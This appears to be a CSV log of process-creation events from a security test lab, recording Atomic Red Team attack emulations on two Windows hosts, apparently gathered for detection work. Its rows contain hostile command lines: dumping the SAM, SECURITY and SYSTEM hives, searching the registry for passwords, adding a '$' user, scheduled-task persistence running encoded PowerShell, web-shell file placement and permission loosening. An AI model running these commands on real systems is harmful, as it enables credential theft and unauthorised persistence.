process,"process_name","parent_process_name",dest,firstTime,lastTime
"""cmd.exe"" /c ""rmdir /s /Q C:\AtomicRedTeam\atomics\T1560.001\victim-files &gt;nul 2&gt;&amp;1""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:11:00","2023-10-04T09:11:00"
"""cmd.exe"" /c ""sc sdset AtomicService ""D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"" &amp; sc.exe delete AtomicService""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:05:47","2023-10-04T09:05:47"
"""cmd.exe"" /c ""sc sdset AtomicService ""D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"" &amp; sc.exe delete AtomicService""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:06:27","2023-10-04T09:06:27"
"""cmd.exe"" /c ""sc.exe create AtomicService binPath= ""C:\Windows\System32\calc.exe"" &amp; sc sdset AtomicService ""D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)""""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:05:40","2023-10-04T09:05:40"
"""cmd.exe"" /c ""sc.exe create AtomicService binPath= ""C:\Windows\System32\calc.exe"" &amp; sc sdset AtomicService ""D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)""""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:06:18","2023-10-04T09:06:18"
"""cmd.exe"" /c ""sc.exe start spooler &gt;nul 2&gt;&amp;1""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:16:09","2023-10-04T09:16:09"
"""cmd.exe"" /c ""sc.exe start spooler &gt;nul 2&gt;&amp;1""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:15:42","2023-10-04T09:15:42"
"""cmd.exe"" /c ""sc.exe stop spooler""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:16:04","2023-10-04T09:16:04"
"""cmd.exe"" /c ""sc.exe stop spooler""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:15:37","2023-10-04T09:15:37"
"""cmd.exe"" /c ""schtasks /create /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"" &amp; schtasks /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T08:40:46","2023-10-04T08:40:46"
"""cmd.exe"" /c ""schtasks /delete /tn ""ATOMIC-T1053.005"" /F &gt;nul 2&gt;&amp;1 &amp; reg delete HKCU\SOFTWARE\ATOMIC-T1053.005 /F &gt;nul 2&gt;&amp;1""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T08:41:05","2023-10-04T08:41:05"
"""cmd.exe"" /c ""schtasks /delete /tn ""T1053_005_OnLogon"" /f &gt;nul 2&gt;&amp;1 &amp; schtasks /delete /tn ""T1053_005_OnStartup"" /f &gt;nul 2&gt;&amp;1""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T08:40:59","2023-10-04T08:40:59"
"""cmd.exe"" /c ""takeown.exe /f %%temp%%\T1222.001_takeown_folder /r""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:01:15","2023-10-04T09:01:15"
"""cmd.exe"" /c ""takeown.exe /f %%temp%%\T1222.001_takeown_folder /r""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:00:46","2023-10-04T09:00:46"
"""cmd.exe"" /c ""taskkill.exe /f /im spoolsv.exe""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:16:05","2023-10-04T09:16:05"
"""cmd.exe"" /c ""taskkill.exe /f /im spoolsv.exe""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:15:38","2023-10-04T09:15:38"
"""cmd.exe"" /c ""xcopy /I /Y C:\AtomicRedTeam\atomics\T1505.003\src C:\inetpub\wwwroot""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T08:47:37","2023-10-04T08:47:37"
"""cmd.exe"" /c ""xcopy /I /Y C:\AtomicRedTeam\atomics\T1505.003\src C:\inetpub\wwwroot""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T08:47:08","2023-10-04T08:47:08"
"C:\Windows\System32\cmd.exe /c """"","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T08:41:45","2023-10-04T09:38:48"
"C:\Windows\System32\cmd.exe /c """"","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T08:39:52","2023-10-04T09:35:10"
"C:\Windows\System32\cmd.exe /c """"%programfiles%/WinRAR/Rar.exe"" a -r %USERPROFILE%\T1560.001-data.rar %USERPROFILE%\*.txt""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:11:22","2023-10-04T09:11:22"
"C:\Windows\System32\cmd.exe /c """"%programfiles%/WinRAR/Rar.exe"" a -r %USERPROFILE%\T1560.001-data.rar %USERPROFILE%\*.txt""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:10:12","2023-10-04T09:10:12"
"C:\Windows\System32\cmd.exe /c ""%LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! &gt; hello.txt &amp; type hello.txt""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:38:38","2023-10-04T09:38:38"
"C:\Windows\System32\cmd.exe /c ""%LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! &gt; hello.txt &amp; type hello.txt""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:34:59","2023-10-04T09:34:59"
"C:\Windows\System32\cmd.exe /c ""SCHTASKS /Create /S localhost /RU DOMAIN\user /RP At0micStrong /TN ""Atomic task"" /TR ""C:\windows\system32\cmd.exe"" /SC daily /ST 20:10""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T08:40:47","2023-10-04T08:40:47"
"C:\Windows\System32\cmd.exe /c ""SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T08:40:47","2023-10-04T08:40:47"
"C:\Windows\System32\cmd.exe /c ""SCHTASKS /Delete /S localhost /U DOMAIN\user /P At0micStrong /TN ""Atomic task"" /F &gt;nul 2&gt;&amp;1""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T08:40:59","2023-10-04T08:40:59"
"C:\Windows\System32\cmd.exe /c ""SCHTASKS /Delete /TN spawn /F &gt;nul 2&gt;&amp;1""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T08:40:59","2023-10-04T08:40:59"
"C:\Windows\System32\cmd.exe /c ""at 13:20 /interactive cmd""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T08:41:41","2023-10-04T08:41:41"
"C:\Windows\System32\cmd.exe /c ""at 13:20 /interactive cmd""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T08:39:46","2023-10-04T08:39:46"
"C:\Windows\System32\cmd.exe /c ""attrib.exe -r %temp%\T1222.001_attrib\*.* /s""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:01:16","2023-10-04T09:01:16"
"C:\Windows\System32\cmd.exe /c ""attrib.exe -r %temp%\T1222.001_attrib\*.* /s""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:00:47","2023-10-04T09:00:47"
"C:\Windows\System32\cmd.exe /c ""cmd /r cmd&lt;C:\AtomicRedTeam\atomics\T1059.003\src\t1059.003_cmd.cmd""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:38:41","2023-10-04T09:38:41"
"C:\Windows\System32\cmd.exe /c ""cmd /r cmd&lt;C:\AtomicRedTeam\atomics\T1059.003\src\t1059.003_cmd.cmd""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:35:02","2023-10-04T09:35:02"
"C:\Windows\System32\cmd.exe /c ""del ""%TEMP%\test.bin"" &gt;nul 2&gt;&amp;1""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:38:48","2023-10-04T09:38:48"
"C:\Windows\System32\cmd.exe /c ""del ""%TEMP%\test.bin"" &gt;nul 2&gt;&amp;1""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:35:09","2023-10-04T09:35:09"
"C:\Windows\System32\cmd.exe /c ""del /A:H %temp%\T1222.001_attrib_2\T1222.001_attrib*.txt &gt;nul 2&gt;&amp;1""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:01:21","2023-10-04T09:01:21"
"C:\Windows\System32\cmd.exe /c ""del /A:H %temp%\T1222.001_attrib_2\T1222.001_attrib*.txt &gt;nul 2&gt;&amp;1""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:00:53","2023-10-04T09:00:53"
"C:\Windows\System32\cmd.exe /c ""del /f /q /s %USERPROFILE%\T1560.001-data.rar &gt;nul 2&gt;&amp;1""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:12:09","2023-10-04T09:12:09"
"C:\Windows\System32\cmd.exe /c ""del /f /q /s %USERPROFILE%\T1560.001-data.rar &gt;nul 2&gt;&amp;1""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:11:00","2023-10-04T09:11:00"
"C:\Windows\System32\cmd.exe /c ""del C:\inetpub\wwwroot\b.jsp /q &gt;nul 2&gt;&amp;1 &amp; del C:\inetpub\wwwroot\tests.jsp /q &gt;nul 2&gt;&amp;1 &amp; del C:\inetpub\wwwroot\cmd.aspx /q &gt;nul 2&gt;&amp;1""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T08:47:42","2023-10-04T08:47:42"
"C:\Windows\System32\cmd.exe /c ""del C:\inetpub\wwwroot\b.jsp /q &gt;nul 2&gt;&amp;1 &amp; del C:\inetpub\wwwroot\tests.jsp /q &gt;nul 2&gt;&amp;1 &amp; del C:\inetpub\wwwroot\cmd.aspx /q &gt;nul 2&gt;&amp;1""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T08:47:13","2023-10-04T08:47:13"
"C:\Windows\System32\cmd.exe /c ""echo ""Hello from the Windows Command Prompt!"" &gt; ""%TEMP%\test.bin"" &amp; type ""%TEMP%\test.bin""""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:38:38","2023-10-04T09:38:38"
"C:\Windows\System32\cmd.exe /c ""echo ""Hello from the Windows Command Prompt!"" &gt; ""%TEMP%\test.bin"" &amp; type ""%TEMP%\test.bin""""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:34:59","2023-10-04T09:34:59"
"C:\Windows\System32\cmd.exe /c ""icacls ""C:\Users\Public\*"" /grant Everyone:F /T /C /Q""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:01:16","2023-10-04T09:01:16"
"C:\Windows\System32\cmd.exe /c ""icacls ""C:\Users\Public\*"" /grant Everyone:F /T /C /Q""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:00:47","2023-10-04T09:00:47"
"C:\Windows\System32\cmd.exe /c ""icacls 'C:\Users\Public\*' /restore %temp%\T1222.001-folder-perms-backup.txt /q &gt;nul 2&gt;&amp;1""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:01:21","2023-10-04T09:01:21"
"C:\Windows\System32\cmd.exe /c ""icacls 'C:\Users\Public\*' /restore %temp%\T1222.001-folder-perms-backup.txt /q &gt;nul 2&gt;&amp;1""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:00:53","2023-10-04T09:00:53"
"C:\Windows\System32\cmd.exe /c ""icacls C:\Users\Public\* /save %temp%\T1222.001-folder-perms-backup.txt /t /q &gt;nul 2&gt;&amp;1""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:01:11","2023-10-04T09:01:11"
"C:\Windows\System32\cmd.exe /c ""icacls C:\Users\Public\* /save %temp%\T1222.001-folder-perms-backup.txt /t /q &gt;nul 2&gt;&amp;1""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:00:41","2023-10-04T09:00:41"
"C:\Windows\System32\cmd.exe /c ""icacls.exe %temp%\T1222.001_cacls /grant Everyone:F""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:01:16","2023-10-04T09:01:16"
"C:\Windows\System32\cmd.exe /c ""icacls.exe %temp%\T1222.001_cacls /grant Everyone:F""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:00:47","2023-10-04T09:00:47"
"C:\Windows\System32\cmd.exe /c ""mkdir %temp%\T1222.001_attrib &amp; echo T1222.001_attrib1 &gt;&gt; %temp%\T1222.001_attrib\T1222.001_attrib1.txt &amp; echo T1222.001_attrib2 &gt;&gt; %temp%\T1222.001_attrib\T1222.001_attrib2.txt &amp; attrib.exe +r %temp%\T1222.001_attrib\T1222.001_attrib1.txt &amp; attrib.exe +r %temp%\T1222.001_attrib\T1222.001_attrib2.txt""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:01:11","2023-10-04T09:01:11"
"C:\Windows\System32\cmd.exe /c ""mkdir %temp%\T1222.001_attrib &amp; echo T1222.001_attrib1 &gt;&gt; %temp%\T1222.001_attrib\T1222.001_attrib1.txt &amp; echo T1222.001_attrib2 &gt;&gt; %temp%\T1222.001_attrib\T1222.001_attrib2.txt &amp; attrib.exe +r %temp%\T1222.001_attrib\T1222.001_attrib1.txt &amp; attrib.exe +r %temp%\T1222.001_attrib\T1222.001_attrib2.txt""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:00:41","2023-10-04T09:00:41"
"C:\Windows\System32\cmd.exe /c ""mkdir %temp%\T1222.001_attrib_2 &gt;nul 2&gt;&amp;1 &amp; echo T1222.001_attrib1 &gt;&gt; %temp%\T1222.001_attrib_2\T1222.001_attrib1.txt &amp; echo T1222.001_attrib2 &gt;&gt; %temp%\T1222.001_attrib_2\T1222.001_attrib2.txt &amp; attrib.exe +h %temp%\T1222.001_attrib_2\T1222.001_attrib1.txt &amp; attrib.exe +h %temp%\T1222.001_attrib_2\T1222.001_attrib2.txt""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:01:16","2023-10-04T09:01:16"
"C:\Windows\System32\cmd.exe /c ""mkdir %temp%\T1222.001_attrib_2 &gt;nul 2&gt;&amp;1 &amp; echo T1222.001_attrib1 &gt;&gt; %temp%\T1222.001_attrib_2\T1222.001_attrib1.txt &amp; echo T1222.001_attrib2 &gt;&gt; %temp%\T1222.001_attrib_2\T1222.001_attrib2.txt &amp; attrib.exe +h %temp%\T1222.001_attrib_2\T1222.001_attrib1.txt &amp; attrib.exe +h %temp%\T1222.001_attrib_2\T1222.001_attrib2.txt""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:00:47","2023-10-04T09:00:47"
"C:\Windows\System32\cmd.exe /c ""mkdir %temp%\T1222.001_cacls &amp; echo T1222.001_cacls1 &gt;&gt; %temp%\T1222.001_cacls\T1222.001_cacls1.txt &amp; echo T1222.001_cacls2 &gt;&gt; %temp%\T1222.001_cacls\T1222.001_cacls2.txt""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:01:11","2023-10-04T09:01:11"
"C:\Windows\System32\cmd.exe /c ""mkdir %temp%\T1222.001_cacls &amp; echo T1222.001_cacls1 &gt;&gt; %temp%\T1222.001_cacls\T1222.001_cacls1.txt &amp; echo T1222.001_cacls2 &gt;&gt; %temp%\T1222.001_cacls\T1222.001_cacls2.txt""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:00:41","2023-10-04T09:00:41"
"C:\Windows\System32\cmd.exe /c ""mkdir %temp%\T1222.001_takeown_folder &amp; echo T1222.001_takeown1 &gt;&gt; %temp%\T1222.001_takeown_folder\T1222.001_takeown1.txt &amp; echo T1222.001_takeown2 &gt;&gt; %temp%\T1222.001_takeown_folder\T1222.001_takeown2.txt""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:01:11","2023-10-04T09:01:11"
"C:\Windows\System32\cmd.exe /c ""mkdir %temp%\T1222.001_takeown_folder &amp; echo T1222.001_takeown1 &gt;&gt; %temp%\T1222.001_takeown_folder\T1222.001_takeown1.txt &amp; echo T1222.001_takeown2 &gt;&gt; %temp%\T1222.001_takeown_folder\T1222.001_takeown2.txt""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:00:41","2023-10-04T09:00:41"
"C:\Windows\System32\cmd.exe /c ""mkdir .\tmp\victim-files &amp; cd .\tmp\victim-files &amp; echo ""This file will be encrypted"" &gt; .\encrypted_file.txt &amp; ""%programfiles%/WinRAR/Rar.exe"" a -hp""blue"" hello.rar &amp; dir""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:11:55","2023-10-04T09:11:55"
"C:\Windows\System32\cmd.exe /c ""mkdir .\tmp\victim-files &amp; cd .\tmp\victim-files &amp; echo ""This file will be encrypted"" &gt; .\encrypted_file.txt &amp; ""%programfiles%/WinRAR/Rar.exe"" a -hp""blue"" hello.rar &amp; dir""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:10:46","2023-10-04T09:10:46"
"C:\Windows\System32\cmd.exe /c ""mkdir C:\AtomicRedTeam\atomics\T1560.001\victim-files &amp; cd C:\AtomicRedTeam\atomics\T1560.001\victim-files &amp; echo ""This file will be encrypted"" &gt; .\encrypted_file.txt &amp; ""%ProgramFiles%\7-zip\7z.exe"" u archive.7z *txt -pblue &amp; dir""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:11:55","2023-10-04T09:11:55"
"C:\Windows\System32\cmd.exe /c ""mkdir C:\AtomicRedTeam\atomics\T1560.001\victim-files &amp; cd C:\AtomicRedTeam\atomics\T1560.001\victim-files &amp; echo ""This file will be encrypted"" &gt; .\encrypted_file.txt &amp; ""%ProgramFiles%\7-zip\7z.exe"" u archive.7z *txt -pblue &amp; dir""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:10:46","2023-10-04T09:10:46"
"C:\Windows\System32\cmd.exe /c ""net user $ /DELETE 2&gt;&amp;1""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:05:46","2023-10-04T09:05:46"
"C:\Windows\System32\cmd.exe /c ""net user $ /DELETE 2&gt;&amp;1""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:06:24","2023-10-04T09:06:24"
"C:\Windows\System32\cmd.exe /c ""net user $ ATOMIC123! /add /active:yes""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:05:38","2023-10-04T09:05:38"
"C:\Windows\System32\cmd.exe /c ""net user $ ATOMIC123! /add /active:yes""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:06:16","2023-10-04T09:06:16"
"C:\Windows\System32\cmd.exe /c ""net.exe start spooler &gt;nul 2&gt;&amp;1""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:16:09","2023-10-04T09:16:09"
"C:\Windows\System32\cmd.exe /c ""net.exe start spooler &gt;nul 2&gt;&amp;1""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:15:42","2023-10-04T09:15:42"
"C:\Windows\System32\cmd.exe /c ""net.exe stop spooler""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:16:05","2023-10-04T09:16:05"
"C:\Windows\System32\cmd.exe /c ""net.exe stop spooler""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:15:38","2023-10-04T09:15:38"
"C:\Windows\System32\cmd.exe /c ""path=%path%;""C:\Program Files (x86)\winzip"" &amp; mkdir .\tmp\victim-files &amp; cd .\tmp\victim-files &amp; echo ""This file will be encrypted"" &gt; .\encrypted_file.txt &amp; ""%ProgramFiles%\WinZip\winzip64.exe"" -min -a -s""hello"" archive.zip * &amp; dir""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:11:55","2023-10-04T09:11:55"
"C:\Windows\System32\cmd.exe /c ""path=%path%;""C:\Program Files (x86)\winzip"" &amp; mkdir .\tmp\victim-files &amp; cd .\tmp\victim-files &amp; echo ""This file will be encrypted"" &gt; .\encrypted_file.txt &amp; ""%ProgramFiles%\WinZip\winzip64.exe"" -min -a -s""hello"" archive.zip * &amp; dir""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:10:46","2023-10-04T09:10:46"
"C:\Windows\System32\cmd.exe /c ""reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f &amp; schtasks.exe /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))"" /sc daily /st 07:45""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T08:40:52","2023-10-04T08:40:52"
"C:\Windows\System32\cmd.exe /c ""reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T08:53:43","2023-10-04T08:53:43"
"C:\Windows\System32\cmd.exe /c ""reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T08:59:26","2023-10-04T08:59:26"
"C:\Windows\System32\cmd.exe /c ""reg query HKLM /f password /t REG_SZ /s &amp; reg query HKCU /f password /t REG_SZ /s""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T08:53:20","2023-10-04T08:53:20"
"C:\Windows\System32\cmd.exe /c ""reg query HKLM /f password /t REG_SZ /s &amp; reg query HKCU /f password /t REG_SZ /s""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T08:59:03","2023-10-04T08:59:03"
"C:\Windows\System32\cmd.exe /c ""reg.exe save hklm\sam C:\Users\ADMINI~1\AppData\Local\Temp\bswdowwkvja""","cmd.exe","WinCreds.exe","ar-win-dc.attackrange.local","2023-10-04T09:22:28","2023-10-04T09:22:28"
"C:\Windows\System32\cmd.exe /c ""reg.exe save hklm\sam C:\Users\ADMINI~1\AppData\Local\Temp\cpkcnqsq""","cmd.exe","WinCreds.exe","ar-win-2.attackrange.local","2023-10-04T09:27:32","2023-10-04T09:27:32"
"C:\Windows\System32\cmd.exe /c ""reg.exe save hklm\security C:\Users\ADMINI~1\AppData\Local\Temp\onqyddyc""","cmd.exe","WinCreds.exe","ar-win-2.attackrange.local","2023-10-04T09:27:32","2023-10-04T09:27:32"
"C:\Windows\System32\cmd.exe /c ""reg.exe save hklm\security C:\Users\ADMINI~1\AppData\Local\Temp\slnzhjhadecd""","cmd.exe","WinCreds.exe","ar-win-dc.attackrange.local","2023-10-04T09:22:28","2023-10-04T09:22:28"
"C:\Windows\System32\cmd.exe /c ""reg.exe save hklm\system C:\Users\ADMINI~1\AppData\Local\Temp\nhvybvu""","cmd.exe","WinCreds.exe","ar-win-dc.attackrange.local","2023-10-04T09:22:28","2023-10-04T09:22:28"
"C:\Windows\System32\cmd.exe /c ""reg.exe save hklm\system C:\Users\ADMINI~1\AppData\Local\Temp\wzpkgricxjp""","cmd.exe","WinCreds.exe","ar-win-2.attackrange.local","2023-10-04T09:27:32","2023-10-04T09:27:32"
"C:\Windows\System32\cmd.exe /c ""rmdir /s /Q C:\AtomicRedTeam\atomics\T1560.001\victim-files &gt;nul 2&gt;&amp;1""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:12:09","2023-10-04T09:12:09"
"C:\Windows\System32\cmd.exe /c ""rmdir /s /Q C:\AtomicRedTeam\atomics\T1560.001\victim-files &gt;nul 2&gt;&amp;1""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:11:00","2023-10-04T09:11:00"
"C:\Windows\System32\cmd.exe /c ""sc sdset AtomicService ""D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"" &amp; sc.exe delete AtomicService""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:05:47","2023-10-04T09:05:47"
"C:\Windows\System32\cmd.exe /c ""sc sdset AtomicService ""D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"" &amp; sc.exe delete AtomicService""","cmd.exe","powershell.exe","ar-win-dc.attackrange.local","2023-10-04T09:06:27","2023-10-04T09:06:27"
"C:\Windows\System32\cmd.exe /c ""sc.exe create AtomicService binPath= ""C:\Windows\System32\calc.exe"" &amp; sc sdset AtomicService ""D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)""""","cmd.exe","powershell.exe","ar-win-2.attackrange.local","2023-10-04T09:05:40","2023-10-04T09:05:40"
